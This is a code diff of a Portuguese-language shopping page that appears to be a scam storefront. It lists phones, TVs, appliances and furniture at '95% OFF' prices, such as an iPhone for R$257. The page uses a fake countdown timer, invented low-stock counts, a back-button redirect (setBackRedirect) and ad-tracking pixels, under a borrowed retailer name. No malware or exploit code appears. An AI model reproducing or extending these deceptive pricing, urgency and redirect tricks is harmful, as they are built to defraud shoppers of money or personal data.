+        '</div>' +
+      '</div>' +
+      '<div class="card-body">' +
+        '<div class="card-name">' + p.name + '</div>' +
+        '<div class="card-price-section">' +
+          '<div class="card-old-price">' + p.oldPrice + '</div>' +
+          '<div class="card-price-row">' +
+            '<span class="card-new-price">' + p.newPrice + '</span>' +
+          '</div>' +
+          (installments ? '<div class="card-installments">' + installments + '</div>' : '') +
+        '</div>' +
+        '<div class="stock-indicator">' +
+          '<div class="stock-bar-bg"><div class="stock-bar-fill ' + level + '" style="width:0%;" data-width="' + stockW + '"></div></div>' +
+          '<div class="stock-text ' + level + '">' + getStockMessage(p.stock, level) + '</div>' +
+        '</div>' +
+      '</div>';
+
+    card.addEventListener('click', function() {
+      if (typeof fbq === 'function') {
+        fbq('track', 'ViewContent', { content_name: p.name, content_ids: [p.id], content_type: 'product' });
+      }
+      if (typeof ttq !== 'undefined') {
+        ttq.track('ViewContent', { content_id: p.id, content_name: p.name, content_type: 'product' });
+      }
+      window.location.href = '../produtos/' + p.id + '/index.html' + qs;
+    });
+
+    grid.appendChild(card);
+  });
+
+  // Sold out (only on "todos" view)
+  if (filter === 'todos') {
+    soldOutProducts.forEach(function(sp, idx) {
+      var card = document.createElement('div');
+      card.className = 'product-card sold-out';
+      card.style.animationDelay = ((filtered.length + idx) * 0.05) + 's';
+      card.innerHTML =
+        '<div class="card-image">' +
+          '<img src="' + sp.image + '" alt="' + sp.name + '" loading="lazy" style="max-height:100px;">' +
+          '<div class="sold-out-badge">ESGOTADO</div>' +
+        '</div>' +
+        '<div class="card-body">' +
+          '<div class="card-name">' + sp.name + '</div>' +
+        '</div>';
+      grid.appendChild(card);
     });
   }
 
-  setBackRedirect(link);
-</script><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>95% de Desconto</title><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="icon" href="images/favicon.png"><link rel="shortcut icon" href="images/favicon.png"><link rel="stylesheet" href="css/products.css"><link rel="stylesheet" href="css/styles2.css"><link rel="stylesheet" href="css/fonts.css"><link rel="stylesheet" href="family%253DMaterial%252BSymbols%252BOutlined_opsz%252Cwght%252CFILL%252CGRAD%254024%252C400%252C1%252C0"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined"><style>
-      .free-shipping-container {
-        margin-bottom: 6px;
-      }
+  // Trigger entrance animations
+  requestAnimationFrame(function() {
+    observeCards();
+    animateStockBars();
+  });
+}
 
-      .estoque {
-        font-size: 10pt;
-        padding: 3px;
-      }
-
-      .estoque-verde {
-        color: rgb(0, 132, 18);
-        background-color: #CBFFC7;
-      }
-
-      .estoque-amarelo {
-        color: rgb(132, 121, 0);
-        background-color: #ffffc7;
-      }
-
-      .estoque-vermelho {
-        color: rgb(255, 46, 46);
-        background-color: #FFDCDC;
-      }
-
-      .product-name {
-        margin-top: 5px;
-      }
-    </style><meta charset="utf-8"></head>
-
-
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-
-    
-
-
-  
-  
-    <body><div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Aproveite 95% de desconto aplicado automaticamente na sua compra!</div>
-    <nav class="navbar" style="padding-top: 15px;">
-      <div class="menu-icon" style="padding-left: 3%;">
-        <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
-      </div>
-      <div class="logo-central"></div>
-      <div class="menu-icon" style="padding-right: 3%;">
-        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
-      </div>
-    </nav>
-    <img src="images/desconto-banner.jpg" style="width: 100%; margin-top: -2px;">
-
-<!-- BANNER GRADIENTE -->
-<div style="
-    width: 90%;
-    margin: 10px auto;
-    border-radius: 8px;
-    background: linear-gradient(to right, #011E51, #a52aad);
-    padding: 10px;
-    color: #fff;
-    font-family: 'GellixMedium';
-    text-align: center;
-">
-  Oferta Disponível
-  <span style="font-size: 12px;">
-    Tempo restante: <span id="countdown">01:25:39</span>
-  </span>
-</div>
-
-<script>
-  const countdown = document.getElementById("countdown");
-  let [h, m, s] = countdown.textContent.split(":").map(Number);
-  const timer = setInterval(() => {
-    if (--s < 0) s = 59, m--;
-    if (m < 0) m = 59, h--;
-    if (h < 0) clearInterval(timer), countdown.textContent = "Oferta Expirada";
-    countdown.textContent = `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
-  }, 1000);
-</script>
-
-
-
-
-
-
-    <div class="bracelet-grid">
-      <div class="bracelet-item" onclick="window.location.href='../produtos/jbl01/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Boombox 3'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/poco_preto.png" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 2.999,90</div>
-          <span class="new-price">R$ 67,79</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-verde">Restam 19 unidades</span>
-          <p class="product-name">JBL Boombox 3 <span style="font-family: 'GellixBold';">Preta</span>
-            </p>
-            
-            
-</div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/projetor04/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/1.webp" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 4.398,00</div>
-          <span class="new-price">R$ 97,90</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 10 unidades</span>
-          <p class="product-name">Samsung Galaxy S24 Ultra (256 GB)</p>
-          
-
-            
-</div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/jbl02/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/JBL2.webp" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 5.398,00</div>
-          <span class="new-price">R$ 89,98</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 10 unidades</span>
-          <p class="product-name">JBL Partybox 710 Preta </p>
-          
-</div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/lilo/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DISNEY</div>
-          <div class="old-price">R$ 398,00</div>
-          <span class="new-price">R$ 79,29</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 24 unidades</span>
-          <p class="product-name">Pelúcia Stitch Grande</p>
-          
-
-</div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/sam25/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/s1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 10.398,00</div>
-          <span class="new-price">R$ 247,90</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 16 unidades</span>
-          <p class="product-name">Samsung Galaxy S25 Ultra 5G, 512GB, Câmera Quádrupla Titânio Preto </p>
-          
-
-            
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/iphone16-preto/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphon1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 12.895,00</div>
-          <span class="new-price">R$ 257,00</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
-          <p class="product-name">iPhone 16 Pro Max (1T) <span style="font-family: 'GellixBold';">Titânio Preto</span>
-          </p>
-           
-
-</div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/fritadeira/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/f1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 529,99</div>
-          <span class="new-price">R$ 81,24</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 15 unidades</span>
-          <p class="product-name">Air Fryer Fritadeira Elétrica </p>
-          
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/xiaome/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Flip 6'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/x1_1.jpg" style="height: 140px; width: auto;">
-          
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 1685,00</div>
-          <span class="new-price">R$ 87,00</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-verde">Restam 14 unidades</span>
-          <p class="product-name">Xiaome POCO X5 256GB <span style="font-family: 'GellixBold';">Blue</span>
-        </p></div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/kitferramenta/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Apple Watch Series 9'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/ferramenta.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 1.050,90</div>
-          <span class="new-price">R$ 83,97</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
-          <p class="product-name">Kit Combinado de 7 Ferramentas<span style="font-family: 'GellixBold';">DEWALT</span>
-          </p>
-          
-        
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/iph06/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_pro_max_titanio_branco.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 5.849,10</div>
-          <span class="new-price">R$ 117,58</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
-          <p class="product-name">iPhone 15 Pro (256GB) <span style="font-family: 'GellixBold';">Titânio Branco</span>
-          </p>
-
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/iph07/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_rosa.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 5.849,10</div>
-          <span class="new-price">R$ 97,90</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 6 unidades</span>
-          <p class="product-name">iPhone 15 (256GB) <span style="font-family: 'GellixBold';">Rosa</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/iph08/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro Max'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_pro_max_titanio_preto.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 6.199,00</div>
-          <span class="new-price">R$ 134,90</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 8 unidades</span>
-          <p class="product-name">iPhone 15 Pro Max (512GB) <span style="font-family: 'GellixBold';">Titânio Preto</span>
-            </p>
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/geladeira/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/geladeira.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 3.999,00</div>
-          <span class="new-price">R$ 167,82</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
-          <p class="product-name">Geladeira Brastemp 588 Litros Inox 220V <span style="font-family: 'GellixBold';">Inox 220V</span>
-           
-            </p>
-            
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/xiaomex6/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/x1_2.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 3.527,00</div>
-          <span class="new-price">R$ 97,37</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 09 unidades</span>
-          <p class="product-name">Xiaomi Poco X6 Pro 8gb Ram 256gb <span style="font-family: 'GellixBold';">Cor Preto</span>
-            </p>
-            
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/xiaomex7/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/x1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 3.999,00</div>
-          <span class="new-price">R$ 148,89</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 12 unidades</span>
-          <p class="product-name">Xiaomi Poco X7 Pro 512gb+12gb  <span style="font-family: 'GellixBold';">2025</span>
-            </p>
-            
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/aspirador/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/as1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 349,00</div>
-          <span class="new-price">R$ 94,60</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
-          <p class="product-name">Robô aspirador Robot W90  <span style="font-family: 'GellixBold';"></span>
-            
-        </p></div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/guarda-branco/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/g1_1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 1.049,05</div>
-          <span class="new-price">R$ 114,60</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 16 unidades</span>
-          <p class="product-name">Guarda-roupa casal Easy Slim com Espelho <span style="font-family: 'GellixBold';"></span>
-            </p>
-            
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/guarda-preto/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/g1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 1049,00</div>
-          <span class="new-price">R$ 107,00</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
-          <p class="product-name">Guarda Roupa Casal 8 Portas Cor Preto Fosco <span style="font-family: 'GellixBold';"></span>
-            </p>
-            
-            
-             
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/sofa/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/s1_2.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 2.990,05</div>
-          <span class="new-price">R$ 79,47</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 18 unidades</span>
-          <p class="product-name">Sofá Retrátil Reclinável 2,00m <span style="font-family: 'GellixBold';">King House</span>
-            </p>
-               
-          
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/iph09/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/iphone_15_pro_titanio.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 6.999,00</div>
-          <span class="new-price">R$ 117,58</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 4 unidades</span>
-          <p class="product-name">iPhone 15 Pro (256GB) <span style="font-family: 'GellixBold';">Titânio</span>
-          </p>
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/tv/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/tv1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 2.999,99</div>
-          <span class="new-price">R$ 142,98</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 12 unidades</span>
-          <p class="product-name">Samsung Smart Tv 55 Polegadas <span style="font-family: 'GellixBold';">Qled 4k 2024</span>
-          </p>
-          
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/ps5/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/s1_1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 6.499,99</div>
-          <span class="new-price">R$ 108,17</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 07 unidades</span>
-          <p class="product-name">Playstation Ps5 PRO <span style="font-family: 'GellixBold';">Branco 2 TB</span>
-          </p>
-          
-        </div>
-      </div>
-      <div class="bracelet-item" onclick="window.location.href='../produtos/microo/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/m1.jpg" style="height: 140px; width: auto;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
-          <div class="old-price">R$ 1.757,99</div>
-          <span class="new-price">R$ 102,16</span>
-          <span class="discount">95% OFF</span>
-          <div class="free-shipping-container">
-            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
-              <span style="font-family: 'GellixSemiBold';">FULL</span>
-            </span>
-          </div>
-          <span class="estoque estoque-vermelho">Restam 04 unidades</span>
-          <p class="product-name">Microondas Brastemp 38L <span style="font-family: 'GellixBold';">Inox</span>
-          </p>
-        </div>
-      </div>
-
-       <!--------------------- Máquina de lavar --------------------->
-
-
-        <div class="bracelet-item" onclick="window.location.href='../produtos/lavar/index.html' + window.location.search;">
-            <div class="product-image">
-                <img src="images/lavar1.jpg" style="height: 130px; width: auto;">
-            </div>
-            <div class="product-info">
-                <div class="offer-tag">OFERTA DO DIA</div>
-
-                <div class="old-price">R$ 3999,99</div>
-
-                <span class="new-price">R$ 116,90</span><span class="discount">95% OFF</span>
-
-                <div class="free-shipping-container">
-                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
-                </div>
-
-                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
-                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 8 unidades</p>
-                </div>
-
-                <p class="product-name">Lava E Seca Samsung Inox 11kg</p>
-            </div>
-        </div>
-
-        
-
-
-        <!--------------------- Ar condicionado --------------------->
-
-
-        <div class="bracelet-item" onclick="window.location.href='../produtos/ar/index.html' + window.location.search;">
-            <div class="product-image">
-                <img src="images/ar1.webp" style="height: 130px; width: auto;">
-            </div>
-            <div class="product-info">
-                <div class="offer-tag">OFERTA DO DIA</div>
-
-                <div class="old-price">R$ 1499,90</div>
-
-                <span class="new-price">R$ 114,19</span><span class="discount">95% OFF</span>
-
-                <div class="free-shipping-container">
-                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
-                </div>
-
-                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
-                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 9 unidades</p>
-                </div>
-
-                <p class="product-name">Ar Condicionado Split LG 24000 B</p>
-            </div>
-        </div>
-
-                <!--------------------- Fogão --------------------->
-
-
-        <div class="bracelet-item" onclick="window.location.href='../produtos/fogao/index.html' + window.location.search;">
-            <div class="product-image">
-                <img src="images/f1_1.jpg" style="height: 130px; width: auto;">
-            </div>
-            <div class="product-info">
-                <div class="offer-tag">OFERTA DO DIA</div>
-
-                <div class="old-price">R$ 2099,90</div>
-
-                <span class="new-price">R$ 99,99</span><span class="discount">95% OFF</span>
-
-                <div class="free-shipping-container">
-                    <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
-                </div>
-
-                <div style="background-color: #fffccb; width: 81%; border-radius: 5px; padding: 0px 5px">
-                    <p style="font-size: 12px; color: #585004; font-family: 'GellixRegular'; margin-left: 2%;">Restam 7 unidades</p>
-                </div>
-
-                <p class="product-name">Fogão 5 Bocas Atlas Com Mesa De Vidro 127V/220V</p>
-            </div>
-        </div>
-
-
-      <div class="bracelet-item">
-        <div class="product-image" style="margin-bottom: 10px;">
-          <img src="images/poco_antigo.webp" style="height: 115px; width: auto; margin-top: 20px;">
-        </div>
-        <div class="product-info">
-          <div class="offer-tag">OFERTA DO DIA</div>
